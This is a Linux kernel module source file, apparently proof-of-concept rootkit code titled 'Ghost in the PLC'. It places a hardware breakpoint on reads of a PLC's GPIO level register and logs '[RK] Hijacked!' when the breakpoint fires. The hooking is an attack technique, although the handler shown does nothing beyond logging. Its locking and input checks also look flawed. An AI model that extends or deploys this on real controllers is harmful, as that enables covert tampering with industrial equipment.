/*
 * Usage: insmod drk.ko gpioB=pchar
 */
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/perf_event.h>
#include <linux/hw_breakpoint.h>

static char* gpioB = "0x00";
volatile unsigned* gpio = 0x00;
static long lvl_p = 0;
struct perf_event** volatile drpcpu;
static DEFINE_MUTEX(dr_lock);
#define reset_dr(dr) unregister_wide_hw_breakpoint(dr)
#define atomic_reset_dr(dr) do {	\
	mutex_lock(&dr_lock);   	\
	if (dr) reset_dr(dr);   	\
	dr = NULL;              	\
	mutex_unlock(&dr_lock); 	\
} while (0)

module_param(gpioB, charp, 0000);
MODULE_PARM_DESC(gpioB, "Base address of GPIO");

static void dr_handler(struct perf_event *bp, struct perf_sample_data *data, struct pt_regs *regs) {
	printk(KERN_INFO "[RK] Hijacked!\n");
	atomic_reset_dr(drpcpu);
}

static int hw_break_module_init(void) {
	int ret;
	long l;
	char* endptr = NULL;
	struct perf_event_attr attr;

	printk(KERN_INFO "[RK] init\n");

	l = simple_strtol(gpioB, &endptr, 0);
	if (endptr == NULL) {
		printk(KERN_INFO "[RK] Unable to cast input address\n");
		return -EINVAL;
	}
	gpio = (unsigned *)l; // GPIO base
	lvl_p = (l+(long)0x34); // Offset of LVL register

	hw_breakpoint_init(&attr);
	attr.bp_addr = lvl_p; // Monitor LVL register
	attr.bp_len = HW_BREAKPOINT_LEN_4;
	attr.bp_type = HW_BREAKPOINT_R; // Read operation
	
	drpcpu = register_wide_hw_breakpoint(&attr, dr_handler, NULL);
	if (IS_ERR((void*)drpcpu)) {
		ret = PTR_ERR((void*)drpcpu);
		printk(KERN_INFO "[RK] Unable to set debug register\n");
		return ret;
	}

	return 0;
}

static void hw_break_module_exit(void) {
	atomic_reset_dr(drpcpu);
	printk(KERN_INFO "[RK] exit\n");
}

module_init(hw_break_module_init);
module_exit(hw_break_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cl0wn & bl4ckic3");
MODULE_DESCRIPTION("Ghost in the PLC");
